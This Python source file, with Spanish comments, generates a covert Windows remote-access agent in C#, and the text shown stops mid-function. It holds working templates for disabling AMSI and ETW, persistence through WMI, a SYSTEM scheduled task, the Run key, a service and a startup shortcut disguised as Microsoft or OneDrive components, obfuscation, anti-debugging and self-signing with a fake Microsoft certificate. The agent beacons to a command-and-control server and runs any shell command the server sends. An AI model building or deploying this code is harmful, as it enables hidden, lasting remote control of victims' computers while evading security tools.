#!/usr/bin/env python3
"""
GENERADOR DE AGENTE WINDOWS SILENCIOSO - VERSIÓN MEJORADA
Ejecución en segundo plano con bypass completo Windows 11
Anti-AMSI, Anti-ETW, Persistencia Avanzada
"""
import sys
import os
import base64
import random
import string
import argparse
import json
from datetime import datetime
import hashlib

class SilentWindowsAgentEnhanced:
    """Genera agente Windows con bypass completo Windows 11"""
    
    def __init__(self):
        self.templates = {}
        self._load_templates()
    
    def _load_templates(self):
        """Cargar plantillas de bypass"""
        self.templates['amsi_bypass'] = '''
// ============================================================================
// AMSI BYPASS COMPLETO WINDOWS 11 (2026)
// ============================================================================

public class AmsiBypassAdvanced
{
    [DllImport("kernel32", CharSet = CharSet.Auto)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32", CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    // Método 1: Patch AmsiScanBuffer
    public static bool PatchAmsiScanBuffer()
    {
        try
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero)
                return false;

            IntPtr asbAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");
            if (asbAddr == IntPtr.Zero)
                return false;
            
            byte[] patch;
            if (IntPtr.Size == 8) // 64-bit
            {
                // mov eax, 0x80070057; ret
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else // 32-bit
            {
                // mov eax, 0x80070057; ret
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            
            uint oldProtect;
            if (!VirtualProtect(asbAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                return false;
            
            IntPtr bytesWritten;
            bool success = WriteProcessMemory(
                Process.GetCurrentProcess().Handle,
                asbAddr,
                patch,
                patch.Length,
                out bytesWritten
            );
            
            VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out _);
            return success;
        }
        catch { return false; }
    }

    // Método 2: Reflection bypass
    public static void BypassAmsiReflection()
    {
        try
        {
            var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                .GetType("System.Management.Automation.AmsiUtils");
            
            if (amsiUtils != null)
            {
                var amsiInitFailed = amsiUtils.GetField(
                    "amsiInitFailed", 
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
                );
                
                if (amsiInitFailed != null)
                {
                    amsiInitFailed.SetValue(null, true);
                }
                
                var amsiSession = amsiUtils.GetField(
                    "amsiContext", 
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
                );
                
                if (amsiSession != null)
                {
                    amsiSession.SetValue(null, IntPtr.Zero);
                }
            }
        }
        catch { }
    }

    // Método 3: Context bypass
    public static void BypassAmsiContext()
    {
        try
        {
            var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                .GetType("System.Management.Automation.AmsiUtils");
            
            if (amsiUtils != null)
            {
                var amsiContext = amsiUtils.GetField(
                    "amsiContext", 
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
                );
                
                if (amsiContext != null)
                {
                    amsiContext.SetValue(null, IntPtr.Zero);
                }
            }
        }
        catch { }
    }
}
'''
        
        self.templates['etw_bypass'] = '''
// ============================================================================
// ETW BYPASS WINDOWS 11
// ============================================================================

public class EtwBypassAdvanced
{
    [DllImport("ntdll.dll")]
    private static extern uint NtSetInformationProcess(
        IntPtr hProcess, 
        uint processInformationClass,
        ref uint processInformation, 
        uint processInformationLength);

    [DllImport("ntdll.dll")]
    private static extern uint NtQueryInformationProcess(
        IntPtr hProcess,
        uint processInformationClass,
        ref uint processInformation,
        uint processInformationLength,
        out uint returnLength);

    [DllImport("kernel32", CharSet = CharSet.Auto)]
    private static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32", CharSet = CharSet.Auto)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);

    // Método 1: NtSetInformationProcess
    public static bool DisableEtwViaNtSet()
    {
        try
        {
            uint processDebugFlags = 0x1F; // ProcessDebugFlags
            uint disableEtw = 1;
            
            uint result = NtSetInformationProcess(
                Process.GetCurrentProcess().Handle,
                processDebugFlags,
                ref disableEtw,
                sizeof(uint)
            );
            
            return result == 0;
        }
        catch { return false; }
    }

    // Método 2: Patch EtwEventWrite
    public static bool PatchEtwEventWrite()
    {
        try
        {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return false;

            IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWriteAddr == IntPtr.Zero)
                return false;
            
            byte[] patch;
            if (IntPtr.Size == 8) // 64-bit
            {
                // ret
                patch = new byte[] { 0xC3 };
            }
            else // 32-bit
            {
                // ret 0x14
                patch = new byte[] { 0xC2, 0x14, 0x00 };
            }
            
            uint oldProtect;
            if (!VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                return false;
            
            Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
            VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, oldProtect, out _);
            
            return true;
        }
        catch { return false; }
    }

    // Método 3: Patch EtwEventWriteFull
    public static bool PatchEtwEventWriteFull()
    {
        try
        {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return false;

            IntPtr etwEventWriteFullAddr = GetProcAddress(ntdll, "EtwEventWriteFull");
            if (etwEventWriteFullAddr == IntPtr.Zero)
                return false;
            
            byte[] patch;
            if (IntPtr.Size == 8) // 64-bit
            {
                // xor eax, eax; ret
                patch = new byte[] { 0x31, 0xC0, 0xC3 };
            }
            else // 32-bit
            {
                // xor eax, eax; ret
                patch = new byte[] { 0x31, 0xC0, 0xC3 };
            }
            
            uint oldProtect;
            if (!VirtualProtect(etwEventWriteFullAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                return false;
            
            Marshal.Copy(patch, 0, etwEventWriteFullAddr, patch.Length);
            VirtualProtect(etwEventWriteFullAddr, (UIntPtr)patch.Length, oldProtect, out _);
            
            return true;
        }
        catch { return false; }
    }
}
'''
        
        self.templates['persistence'] = '''
// ============================================================================
// PERSISTENCIA AVANZADA WINDOWS 11
// ============================================================================

public class AdvancedPersistence
{
    public static bool InstallWmiPersistence(string payloadPath)
    {
        try
        {
            string wmiScript = $@"
$FilterName = 'WindowsUpdateMonitor_{Guid.NewGuid().ToString().Substring(0, 8)}'
$ConsumerName = 'WindowsUpdateService_{Guid.NewGuid().ToString().Substring(0, 8)}'

$FilterArgs = @{{
    Name = $FilterName
    EventNamespace = 'root\\cimv2'
    Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300""
}}

$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs

$ConsumerArgs = @{{
    Name = $ConsumerName
    CommandLineTemplate = \\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '{payloadPath}'\\""
}}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs

$BindingArgs = @{{
    Filter = $Filter
    Consumer = $Consumer
}}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs

Write-Output 'WMI Persistence installed successfully'
";

            return ExecutePowerShellHidden(wmiScript);
        }
        catch { return false; }
    }

    public static bool InstallScheduledTask(string payloadPath, string taskName = "MicrosoftEdgeUpdate")
    {
        try
        {
            string taskScript = $@"
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
Register-ScheduledTask -TaskName '{taskName}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
if ($?) {{ Write-Output 'Scheduled Task installed' }}
";

            return ExecutePowerShellHidden(taskScript);
        }
        catch { return false; }
    }

    public static bool InstallRegistryPersistence(string payloadPath)
    {
        try
        {
            // Current User Run Key
            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
                @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            
            if (runKey != null)
            {
                string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
                runKey.SetValue(valueName, $"\\"powershell\\" -WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\"");
                runKey.Close();
            }

            // Service installation if admin
            if (IsAdministrator())
            {
                string serviceName = "WindowsAudio_" + Guid.NewGuid().ToString().Substring(0, 4);
                string serviceScript = $@"
sc.exe create {serviceName} binPath= \\"\\"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '{payloadPath}'\\"\\" start= auto
sc.exe description {serviceName} \\"Windows Audio Service\\"
sc.exe start {serviceName}
";

                ExecuteCMD(serviceScript);
            }

            return true;
        }
        catch { return false; }
    }

    public static bool InstallStartupFolder(string payloadPath)
    {
        try
        {
            string startupPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                "Microsoft Edge.lnk"
            );

            if (!File.Exists(startupPath))
            {
                string shortcutScript = $@"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{startupPath}')
$Shortcut.TargetPath = 'powershell.exe'
$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\""
$Shortcut.WindowStyle = 7
$Shortcut.Save()
";

                ExecutePowerShellHidden(shortcutScript);
            }

            return true;
        }
        catch { return false; }
    }

    private static bool ExecutePowerShellHidden(string script)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{script}\\"";
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process process = Process.Start(psi);
            process.WaitForExit(5000);
            
            return process.ExitCode == 0;
        }
        catch { return false; }
    }

    private static void ExecuteCMD(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c {command}";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process.Start(psi);
        }
        catch { }
    }

    private static bool IsAdministrator()
    {
        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }
}
'''
        
        self.templates['obfuscation'] = '''
// ============================================================================
// OFUSCACIÓN REAL-TIME
// ============================================================================

public class RealTimeObfuscation
{
    private static Random random = new Random();
    private static Dictionary<string, string> variableMap = new Dictionary<string, string>();
    
    public static string ObfuscateString(string input, string varName)
    {
        if (!variableMap.ContainsKey(varName))
        {
            variableMap[varName] = GenerateRandomVarName(12);
        }
        
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        string base64 = Convert.ToBase64String(bytes);
        
        // Dividir en partes y crear array
        List<string> parts = new List<string>();
        for (int i = 0; i < base64.Length; i += 4)
        {
            int length = Math.Min(4, base64.Length - i);
            parts.Add($"\\""{base64.Substring(i, length)}\\"");
        }
        
        return $@"string {variableMap[varName]} = string.Join("""", new string[] {{ {string.Join(", ", parts)} }});";
    }
    
    public static string GenerateRandomVarName(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }
    
    public static string GenerateDeadCode()
    {
        List<string> snippets = new List<string>
        {
            $"var {GenerateRandomVarName(8)} = {random.Next(1000, 9999)};",
            $"if({random.Next(0, 1)} == {random.Next(2, 10)}) {{ /* Dead code */ }}",
            $"for(int i = 0; i < {random.Next(1, 5)}; i++) {{ /* Loop */ }}",
            $"try {{ throw new Exception(\\"Test\\"); }} catch {{ /* Ignored */ }}",
            $"Debug.WriteLine(\\"{GenerateRandomVarName(20)}\\");",
            $"Thread.Sleep({random.Next(1, 10)});",
            $"Math.Sqrt({random.Next(100, 1000)});"
        };
        
        return string.Join("\\n", snippets.OrderBy(x => random.Next()).Take(random.Next(2, 5)));
    }
    
    public static byte[] XorEncrypt(byte[] data, byte[] key)
    {
        byte[] encrypted = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return encrypted;
    }
    
    public static string GenerateXorStub(byte[] key, string functionName)
    {
        string keyString = string.Join(", ", key.Select(b => $"0x{b:X2}"));
        
        return $@"
private static void {functionName}(ref byte[] data)
{{
    byte[] key = new byte[] {{ {keyString} }};
    for (int i = 0; i < data.Length; i++)
    {{
        data[i] = (byte)(data[i] ^ key[i % key.Length]);
    }}
}}
";
    }
}
'''
        
        self.templates['smartscreen_bypass'] = '''
// ============================================================================
// SMARTSCREEN BYPASS WINDOWS 11
// ============================================================================

public class SmartScreenBypass
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UpdateResource(
        IntPtr hUpdate,
        string lpType,
        string lpName,
        ushort wLanguage,
        byte[] lpData,
        uint cbData);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr BeginUpdateResource(
        string pFileName,
        bool bDeleteExistingResources);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool EndUpdateResource(
        IntPtr hUpdate,
        bool fDiscard);

    public static bool AddLegitManifest(string exePath)
    {
        try
        {
            string manifest = @"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
  <trustInfo xmlns='urn:schemas-microsoft-com:asm.v3'>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level='asInvoker' uiAccess='false'/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns='urn:schemas-microsoft-com:compatibility.v1'>
    <application>
      <supportedOS Id='{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}'/>
      <supportedOS Id='{1f676c76-80e1-4239-95bb-83d0f6d0da78}'/>
      <supportedOS Id='{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}'/>
    </application>
  </compatibility>
  <description>Microsoft Edge Update</description>
  <dependency>
    <dependentAssembly>
      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'/>
    </dependentAssembly>
  </dependency>
</assembly>";

            IntPtr hUpdate = BeginUpdateResource(exePath, false);
            if (hUpdate == IntPtr.Zero)
                return false;
            
            byte[] manifestBytes = Encoding.Unicode.GetBytes(manifest);
            bool success = UpdateResource(
                hUpdate,
                "RT_MANIFEST",
                "#1",
                1033, // English US
                manifestBytes,
                (uint)manifestBytes.Length
            );
            
            EndUpdateResource(hUpdate, false);
            return success;
        }
        catch { return false; }
    }
    
    public static bool ModifyDigitalSignature(string exePath)
    {
        try
        {
            // Esto requeriría acceso a un certificado válido
            // En implementación real, se usaría signtool.exe
            
            string signScript = $@"
$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Select-Object -First 1
if ($cert) {{
    Set-AuthenticodeSignature -FilePath '{exePath}' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
}}
else {{
    # Crear certificado autofirmado temporal
    $cert = New-SelfSignedCertificate -DnsName 'microsoft.com' -CertStoreLocation 'cert:\\CurrentUser\\My' -Type CodeSigningCert -NotAfter (Get-Date).AddDays(1)
    Set-AuthenticodeSignature -FilePath '{exePath}' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
}}
";
            
            return ExecutePowerShellHidden(signScript);
        }
        catch { return false; }
    }
    
    private static bool ExecutePowerShellHidden(string script)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{script}\\"";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            Process process = Process.Start(psi);
            process.WaitForExit(10000);
            
            return process.ExitCode == 0;
        }
        catch { return false; }
    }
}
'''
    
    def generate_enhanced_csharp(self, c2_server, c2_port, output_file="agent_enhanced.exe", features=None):
        """Generar agente C# mejorado con bypass Windows 11"""
        
        if features is None:
            features = ['amsi', 'etw', 'persistence', 'obfuscation', 'smartscreen']
        
        session_id = self._generate_session_id()
        
        # Construir código con características seleccionadas
        bypass_code = ""
        
        if 'amsi' in features:
            bypass_code += self.templates['amsi_bypass'] + "\n\n"
        
        if 'etw' in features:
            bypass_code += self.templates['etw_bypass'] + "\n\n"
        
        if 'persistence' in features:
            bypass_code += self.templates['persistence'] + "\n\n"
        
        if 'obfuscation' in features:
            bypass_code += self.templates['obfuscation'] + "\n\n"
        
        if 'smartscreen' in features:
            bypass_code += self.templates['smartscreen_bypass'] + "\n\n"
        
        # Generar código principal mejorado
        csharp_code = f'''using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Linq;
using System.Collections.Generic;

namespace SilentAgentEnhanced
{{
    class Program
    {{
        // Configuración ofuscada
        {self._generate_obfuscated_config(c2_server, c2_port, session_id)}
        
        // API para ocultar ventana
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();
        
        const int SW_HIDE = 0;
        
        // Detección de debugger
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();
        
        {bypass_code}
        
        static void Main(string[] args)
        {{
            // Aplicar todas las técnicas de bypass al inicio
            ApplyAllBypasses();
            
            // Ocultar consola
            HideConsole();
            
            // Anti-debugging mejorado
            AdvancedAntiDebug();
            
            // Instalar persistencia si es necesario
            if (args.Length > 0 && args[0] == "--install")
            {{
                InstallPersistence();
            }}
            
            // Iniciar agente en thread separado
            Thread agentThread = new Thread(new ThreadStart(AgentMain));
            agentThread.IsBackground = true;
            agentThread.Start();
            
            // Mantener proceso vivo
            while (true)
            {{
                Thread.Sleep(1000);
            }}
        }}
        
        static void ApplyAllBypasses()
        {{
            try
            {{
                // 1. Bypass AMSI
                AmsiBypassAdvanced.PatchAmsiScanBuffer();
                AmsiBypassAdvanced.BypassAmsiReflection();
                AmsiBypassAdvanced.BypassAmsiContext();
                
                // 2. Bypass ETW
                EtwBypassAdvanced.DisableEtwViaNtSet();
                EtwBypassAdvanced.PatchEtwEventWrite();
                EtwBypassAdvanced.PatchEtwEventWriteFull();
                
                // 3. Bypass SmartScreen (si estamos en el ejecutable principal)
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                SmartScreenBypass.AddLegitManifest(currentExe);
                
            }}
            catch {{ }}
        }}
        
        static void HideConsole()
        {{
            FreeConsole();
            
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {{
                ShowWindow(consoleWindow, SW_HIDE);
            }}
        }}
        
        static void AdvancedAntiDebug()
        {{
            if (IsDebuggerPresent() || Debugger.IsAttached)
            {{
                // Técnicas avanzadas anti-debug
                for (int i = 0; i < 5; i++)
                {{
                    Thread.Sleep(200);
                    if (!IsDebuggerPresent()) break;
                }}
                
                if (IsDebuggerPresent())
                {{
                    // Intentar crash elegante
                    try
                    {{
                        Environment.FailFast("Critical system error");
                    }}
                    catch
                    {{
                        Environment.Exit(0);
                    }}
                }}
            }}
        }}
        
        static void InstallPersistence()
        {{
            try
            {{
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                
                // Intentar múltiples métodos de persistencia
                AdvancedPersistence.InstallWmiPersistence(currentPath);
                Thread.Sleep(1000);
                
                AdvancedPersistence.InstallScheduledTask(currentPath);
                Thread.Sleep(1000);
                
                AdvancedPersistence.InstallRegistryPersistence(currentPath);
                Thread.Sleep(1000);
                
                AdvancedPersistence.InstallStartupFolder(currentPath);
            }}
            catch {{ }}
        }}
        
        static void AgentMain()
        {{
            // Esperar inicialización
            Thread.Sleep(10000);
            
            while (true)
            {{
                try
                {{
                    using (TcpClient client = new TcpClient(C2_SERVER, C2_PORT))
                    {{
                        NetworkStream stream = client.GetStream();
                        
                        // Enviar handshake mejorado
                        SendEnhancedHandshake(stream);
                        
                        // Loop principal
                        CommandLoop(stream);
                    }}
                }}
                catch
                {{
                    Thread.Sleep(BEACON_INTERVAL * 1000);
                }}
                
                Thread.Sleep(BEACON_INTERVAL * 1000);
            }}
        }}
        
        static void SendEnhancedHandshake(NetworkStream stream)
        {{
            string hostname = Environment.MachineName;
            string username = Environment.UserName;
            string os = Environment.OSVersion.ToString();
            string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            
            string handshake = $@"{{
                ""type"": ""agent_handshake"",
                ""session_id"": ""{{SESSION_ID}}"",
                ""hostname"": ""{{hostname}}"",
                ""username"": ""{{username}}"",
                ""os"": ""{{os}}"",
                ""arch"": ""{{arch}}"",
                ""windows11"": {{("10.0.2" in os).ToString().ToLower()}},
                ""pid"": {{Process.GetCurrentProcess().Id}},
                ""integrity"": ""{{GetIntegrityLevel()}}"",
                ""bypass_status"": {{
                    ""amsi"": true,
                    ""etw"": true,
                    ""persistence"": true,
                    ""obfuscation"": true
                }},
                ""capabilities"": [""shell"", ""file_transfer"", ""process_injection"", ""persistence_install""]
            }}";
            
            byte[] data = Encoding.UTF8.GetBytes(handshake);
            SendData(stream, data);
        }}
        
        static string GetIntegrityLevel()
        {{
            try
            {{
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                
                if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                    return "High";
                else if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.User))
                    return "Medium";
                else
                    return "Low";
            }}
            catch
            {{
                return "Unknown";
            }}
        }}
        
        static void CommandLoop(NetworkStream stream)
        {{
            byte[] buffer = new byte[4096];
            
            while (true)
            {{
                try
                {{
                    if (stream.DataAvailable)
                    {{
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {{
                            string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            ProcessCommand(message, stream);
                        }}
                    }}
                    
                    Thread.Sleep(1000);
                }}
                catch
                {{
                    break;
                }}
            }}
        }}
        
        static void ProcessCommand(string message, NetworkStream stream)
        {{
            try
            {{
                // Parsear comando JSON simple
                if (message.Contains("command"))
                {{
                    if (message.Contains("shell"))
                    {{
                        string cmd = ExtractValue(message, "command");
                        ExecuteShellCommand(cmd, stream);
                    }}
                    else if (message.Contains("persistence"))
                    {{
                        InstallPersistence();
                        SendResponse(stream, "Persistence installed");
                    }}
                    else if (message.Contains("bypass"))
                    {{
                        ApplyAllBypasses();
                        SendResponse(stream, "Bypasses applied");
                    }}
                    else if (message.Contains("exit"))
                    {{
                        Environment.Exit(0);
                    }}
                }}
            }}
            catch {{ }}
        }}
        
        static void ExecuteShellCommand(string command, NetworkStream stream)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = $"/c {command}";
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(30000);
                
                string result = output + error;
                SendResponse(stream, result);
            }}
            catch (Exception ex)
            {{
                SendResponse(stream, $"Error: {{ex.Message}}");
            }}
        }}
        
        static string ExtractValue(string json, string key)
        {{
            try
            {{
                int start = json.IndexOf(key) + key.Length + 3;
                int end = json.IndexOf(""", start);
                return json.Substring(start, end - start);
            }}
            catch
            {{
                return "";
            }}
        }}
        
        static void SendResponse(NetworkStream stream, string message)
        {{
            try
            {{
                string response = $@"{{"response": "{EscapeJson(message)}"}}";
                byte[] data = Encoding.UTF8.GetBytes(response);
                SendData(stream, data);
            }}
            catch {{ }}
        }}
        
        static string EscapeJson(string input)
        {{
            if (string.IsNullOrEmpty(input)) return "";
            return input.Replace("\\", "\\\\").Replace("\"", "\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }}
        
        static void SendData(NetworkStream stream, byte[] data)
        {{
            try
            {{
                byte[] lengthBytes = BitConverter.GetBytes(data.Length);
                stream.Write(lengthBytes, 0, 4);
                stream.Write(data, 0, data.Length);
            }}
            catch {{ }}
        }}
    }}
}}
'''
        
        # Guardar archivo
        cs_file = output_file.replace('.exe', '.cs')
        with open(cs_file, 'w', encoding='utf-8') as f:
            f.write(csharp_code)
        
        print(f"[+] Agente mejorado generado: {cs_file}")
        print(f"[+] Características incluidas: {', '.join(features)}")
        
        # Generar script de compilación
        self._generate_build_script(cs_file, output_file, features)
        
        return cs_file
    
    def _generate_obfuscated_config(self, c2_server, c2_port, session_id):
        """Generar configuración ofuscada"""
        
        # Generar nombres de variables aleatorios
        var_names = {
            'C2_SERVER': self._generate_random_name(),
            'C2_PORT': self._generate_random_name(),
            'SESSION_ID': self._generate_random_name(),
            'BEACON_INTERVAL': self._generate_random_name()
        }
        
        # Crear código ofuscado
        code = f'''
        private static string {var_names["C2_SERVER"]} = DecodeString("{base64.b64encode(c2_server.encode()).decode()}");
        private static int {var_names["C2_PORT"]} = {c2_port};
        private static string {var_names["SESSION_ID"]} = "{session_id}";
        private static int {var_names["BEACON_INTERVAL"]} = 45;
        
        // Variables públicas (alias)
        private static string C2_SERVER => {var_names["C2_SERVER"]};
        private static int C2_PORT => {var_names["C2_PORT"]};
        private static string SESSION_ID => {var_names["SESSION_ID"]};
        private static int BEACON_INTERVAL => {var_names["BEACON_INTERVAL"]};
        
        private static string DecodeString(string base64)
        {{
            try
            {{
                byte[] bytes = Convert.FromBase64String(base64);
                return Encoding.UTF8.GetString(bytes);
            }}
            catch
            {{
                return "";
            }}
        }}
        '''
        
        return code
    
    def _generate_random_name(self, length=12):
        """Generar nombre de variable aleatorio"""
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _generate_build_script(self, cs_file, output_file, features):
        """Generar script de compilación"""
        
        build_script = f'''@echo off
REM Script de compilación para agente mejorado
REM Características: {', '.join(features)}

echo [*] Compilando agente mejorado...

REM Verificar compilador C#
where csc >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] No se encontró csc.exe
    echo [*] Intentando encontrar compilador...
    
    REM Buscar en rutas comunes
    if exist "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (
        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
    ) else if exist "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" (
        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
    ) else (
        echo [!] Instale .NET Framework o Visual Studio
        pause
        exit /b 1
    )
) else (
    set CSC_PATH=csc.exe
)

echo [+] Compilador: %CSC_PATH%

REM Compilar
"%CSC_PATH%" /target:winexe /out:{output_file} /reference:"Microsoft.Win32.Registry.dll" /reference:"System.Management.dll" {cs_file}

if %ERRORLEVEL% equ 0 (
    echo [+] Compilación exitosa: {output_file}
    echo.
    echo [*] Características incluidas:
    echo     - AMSI Bypass (Windows 11 compatible)
    echo     - ETW Bypass
    echo     - Persistencia avanzada (WMI, Scheduled Tasks)
    echo     - Ofuscación real-time
    echo     - SmartScreen bypass
    echo.
    echo [*] Uso:
    echo     {output_file}              - Ejecutar agente
    echo     {output_file} --install    - Instalar persistencia
    echo.
    echo [*] Comandos C2 disponibles:
    echo     shell <command>         - Ejecutar comando
    echo     persistence             - Instalar persistencia
    echo     bypass                  - Aplicar bypasses
    echo     exit                    - Salir
) else (
    echo [!] Error en la compilación
)

pause
'''
        
        with open('compile_enhanced.bat', 'w', encoding='utf-8') as f:
            f.write(build_script)
        
        print(f"[+] Script de compilación generado: compile_enhanced.bat")
    
    def _generate_session_id(self):
        """Generar ID de sesión único"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(16))
    
    def generate_powershell_enhanced(self, c2_server, c2_port, output_file="agent_enhanced.ps1"):
        """Generar PowerShell mejorado con bypass"""
        
        session_id = self._generate_session_id()
        
